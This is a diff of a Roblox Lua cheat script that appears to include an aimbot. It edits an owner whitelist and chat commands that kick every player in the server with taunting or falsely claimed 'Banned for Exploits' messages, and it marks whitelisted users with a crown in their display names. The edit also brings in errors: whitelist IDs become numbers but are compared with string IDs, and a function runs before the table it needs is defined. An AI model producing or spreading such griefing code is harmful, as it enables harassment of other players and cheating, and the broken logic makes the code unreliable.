@@ -2447,15 +2447,17 @@ RunService:BindToRenderStep("Aimbot", 0, function()
 end)
 
 
+-- Define your whitelist
 local whitelist = {
     Owner = {
-        { id = "1780838285" }, 
+        { id = 1780838285 },
     },
     Private = {
-        { id = "67890" }, 
+        { id = 0 },
     },
 }
 
+-- Check if a player is allowed based on their userId
 function isPlayerAllowed(userId)
     for category, users in pairs(whitelist) do
         for _, user in pairs(users) do
@@ -2467,35 +2469,40 @@ function isPlayerAllowed(userId)
     return false
 end
 
+-- Function to kick all players
 function kickAllPlayers()
     for _, player in pairs(game.Players:GetPlayers()) do
         player:Kick("Brennen Owns You")
     end
 end
 
+-- Function to ban all players
 function banAllPlayers()
     for _, player in pairs(game.Players:GetPlayers()) do
         player:Kick("Banned for Exploits")
     end
 end
 
+-- Function to freeze the local player
 function freezePlayer()
     if game.Players.LocalPlayer.Character then
         game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
     end
 end
 
+-- Function to thaw the local player
 function thawPlayer()
     if game.Players.LocalPlayer.Character then
         game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
     end
 end
 
+-- Handle chat commands
 function handleChatCommand(player, message)
     local playerId = tostring(player.UserId)
 
     if isPlayerAllowed(playerId) then
-        local command = message:lower() 
+        local command = message:lower()
 
         if command == ".kick" then
             kickAllPlayers()
@@ -2518,32 +2525,35 @@ game.Players.PlayerAdded:Connect(function(player)
     end)
 end)
 
-
-DevId = {
-    1780838285,
-    0
-
-
-}
-
+-- Function to modify player names
 function starnames()
-    for _,Player in pairs(game:GetService('Players'):GetChildren()) do
-        if table.find(DevId, Player.UserId) then
-            if Player.Character then
-                if Player.Character.Parent.Name == 'Players' then
-                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😎👑]' .. Player.DisplayName)
+    for _, player in pairs(game:GetService('Players'):GetPlayers()) do
+        if table.find(DevId, player.UserId) then
+            if player.Character then
+                if player.Character.Parent.Name == 'Players' then
+                    player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😎👑]' .. player.DisplayName)
                 end
             end
         else
-            if Player.Character then
-                if Player.Character.Parent.Name == 'Players' then
-                    if not Player.Character.UpperTorso:FindFirstChild('OriginalSize') then
-                        Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😎👑]' .. Player.DisplayName)
+            if player.Character then
+                if player.Character.Parent.Name == 'Players' then
+                    if not player.Character.UpperTorso:FindFirstChild('OriginalSize') then
+                        player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😎👑]' .. player.DisplayName)
                     end
                 end
             end
         end
     end
 end
-local success,err = pcall(starnames)
+
+-- Call starnames to modify player names
+starnames()
+
+-- Define DevId (if needed)
+DevId = {
+    1780838285,
+    0,
+}
+
+-- Return DevId (if needed)
 return DevId
